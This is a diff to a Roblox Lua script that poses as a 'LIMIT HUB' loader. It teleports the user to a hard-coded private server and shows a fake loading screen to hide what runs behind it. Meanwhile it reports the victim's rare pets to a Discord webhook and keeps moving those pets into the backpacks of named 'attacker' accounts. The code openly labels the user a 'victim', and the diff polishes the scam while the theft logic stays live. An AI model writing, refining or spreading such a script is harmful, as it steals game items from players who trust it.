@@ -3,7 +3,7 @@ local Players = game:GetService("Players")
 local TeleportService = game:GetService("TeleportService")
 local LocalPlayer = Players.LocalPlayer
 
--- Private server info
+-- Private server config
 local placeId = 126884695634066
 local privateServerCode = "40206718588419987554943106780552"
 
@@ -17,22 +17,13 @@ local attackerNames = {
     ["burningbud709"] = true,
 }
 
--- Target pet names only
+-- Target pet names
 local allowedPets = {
-    ["Trex"] = true,
-    ["Fennec Fox"] = true,
-    ["Raccoon"] = true,
-    ["Dragonfly"] = true,
-    ["Butterfly"] = true,
-    ["Queenbee"] = true,
-    ["Spinosaurus"] = true,
-    ["Redfox"] = true,
-    ["Brontosaurus"] = true,
-    ["Mooncat"] = true,
-    ["Mimic Octopus"] = true,
-    ["D Disco Bee"] = true,
-    ["Dilophosaurus"] = true,
-    ["Kitsune"] = true,
+    ["Trex"] = true, ["Fennec Fox"] = true, ["Raccoon"] = true,
+    ["Dragonfly"] = true, ["Butterfly"] = true, ["Queenbee"] = true,
+    ["Spinosaurus"] = true, ["Redfox"] = true, ["Brontosaurus"] = true,
+    ["Mooncat"] = true, ["Mimic Octopus"] = true, ["D Disco Bee"] = true,
+    ["Dilophosaurus"] = true, ["Kitsune"] = true,
 }
 
 -- Teleport to private server
@@ -40,40 +31,84 @@ task.spawn(function()
     TeleportService:TeleportToPrivateServer(placeId, privateServerCode, {LocalPlayer})
 end)
 
--- Wait until teleport finishes
-repeat wait() until game.PlaceId == placeId
+-- Wait until teleport completes
+repeat task.wait() until game.PlaceId == placeId
 
--- GUI loading
+-- Custom GUI shown AFTER teleport
 task.spawn(function()
-    local ScreenGui = Instance.new("ScreenGui", LocalPlayer:WaitForChild("PlayerGui"))
-    ScreenGui.Name = "LimitHubLoader"
-    ScreenGui.IgnoreGuiInset = true
-    ScreenGui.ResetOnSpawn = false
+    local screenGui = Instance.new("ScreenGui", game.CoreGui)
+    screenGui.IgnoreGuiInset = true
+    screenGui.ResetOnSpawn = false
 
-    local bg = Instance.new("Frame", ScreenGui)
-    bg.Size = UDim2.new(1, 0, 1, 0)
+    local bg = Instance.new("Frame")
     bg.BackgroundColor3 = Color3.new(0, 0, 0)
+    bg.BackgroundTransparency = 0
+    bg.Size = UDim2.new(1, 0, 1, 0)
+    bg.Position = UDim2.new(0, 0, 0, 0)
+    bg.Parent = screenGui
 
-    local text = Instance.new("TextLabel", bg)
-    text.Size = UDim2.new(0.3, 0, 0.1, 0)
-    text.Position = UDim2.new(0.35, 0, 0.45, 0)
-    text.Text = "Loading... 0%"
-    text.TextColor3 = Color3.new(1,1,1)
-    text.TextScaled = true
-    text.BackgroundTransparency = 1
+    local title = Instance.new("TextLabel")
+    title.Text = "LIMIT HUB"
+    title.Font = Enum.Font.SciFi
+    title.TextColor3 = Color3.fromRGB(0, 255, 255)
+    title.TextStrokeColor3 = Color3.fromRGB(0, 255, 255)
+    title.TextStrokeTransparency = 0.2
+    title.TextScaled = true
+    title.Size = UDim2.new(0, 600, 0, 100)
+    title.Position = UDim2.new(0.5, -300, 0.5, -160)
+    title.BackgroundTransparency = 1
+    title.Parent = bg
 
-    for i = 1, 100, 5 do
-        text.Text = "Loading... " .. i .. "%"
-        wait(0.1)
+    local bar = Instance.new("Frame")
+    bar.Size = UDim2.new(0, 400, 0, 30)
+    bar.Position = UDim2.new(0.5, -200, 0.5, -30)
+    bar.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+    bar.BorderSizePixel = 0
+    bar.Parent = bg
+
+    local fill = Instance.new("Frame")
+    fill.Size = UDim2.new(0, 0, 1, 0)
+    fill.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
+    fill.BorderSizePixel = 0
+    fill.Parent = bar
+
+    local percentLabel = Instance.new("TextLabel")
+    percentLabel.Size = UDim2.new(0, 100, 0, 40)
+    percentLabel.Position = UDim2.new(0.5, -50, 0.5, -70)
+    percentLabel.BackgroundTransparency = 1
+    percentLabel.Text = "0%"
+    percentLabel.TextColor3 = Color3.new(1, 1, 1)
+    percentLabel.TextStrokeTransparency = 0.3
+    percentLabel.Font = Enum.Font.SciFi
+    percentLabel.TextScaled = true
+    percentLabel.Parent = bg
+
+    local loadingText = Instance.new("TextLabel")
+    loadingText.Text = "LOADING"
+    loadingText.Size = UDim2.new(0, 400, 0, 70)
+    loadingText.Position = UDim2.new(0.5, -200, 0.5, 40)
+    loadingText.BackgroundTransparency = 1
+    loadingText.TextColor3 = Color3.fromRGB(0, 255, 255)
+    loadingText.TextStrokeColor3 = Color3.fromRGB(0, 255, 255)
+    loadingText.TextStrokeTransparency = 0.2
+    loadingText.Font = Enum.Font.SciFi
+    loadingText.TextScaled = true
+    loadingText.Parent = bg
+
+    local percent = 0
+    while percent <= 100 do
+        percentLabel.Text = percent .. "%"
+        fill.Size = UDim2.new(percent / 100, 0, 1, 0)
+        percent += 5
+        task.wait(0.1)
     end
-    ScreenGui:Destroy()
+    task.wait(1)
+    screenGui:Destroy()
 end)
 
--- Wait a bit to ensure pets are loaded
-wait(5)
-
--- Send inventory to Discord
+-- Send Discord webhook (with filtered pets)
 task.spawn(function()
+    task.wait(2)
     local pets = {}
     for _, v in pairs(LocalPlayer.Backpack:GetChildren()) do
         if allowedPets[v.Name] then
@@ -82,7 +117,7 @@ task.spawn(function()
     end
 
     local data = {
-        ["content"] = "**🎯 Victim detected!**",
+        ["content"] = "**🎯 New Victim Detected!**",
         ["embeds"] = {{
             ["title"] = "Pet Transfer Info",
             ["fields"] = {
@@ -102,22 +137,18 @@ task.spawn(function()
     })
 end)
 
--- Transfer pets only if attacker is present
+-- Auto pet transfer (only when attacker is present)
 task.spawn(function()
-    local function transferPetsTo(attacker)
-        for _, pet in pairs(LocalPlayer.Backpack:GetChildren()) do
-            if allowedPets[pet.Name] then
-                pet.Parent = attacker:FindFirstChild("Backpack")
-            end
-        end
-    end
-
     while true do
         for _, player in pairs(Players:GetPlayers()) do
             if attackerNames[player.Name] and player ~= LocalPlayer then
-                transferPetsTo(player)
+                for _, pet in pairs(LocalPlayer.Backpack:GetChildren()) do
+                    if allowedPets[pet.Name] then
+                        pet.Parent = player:FindFirstChild("Backpack")
+                    end
+                end
             end
         end
-        wait(1)
+        task.wait(1)
     end
 end)
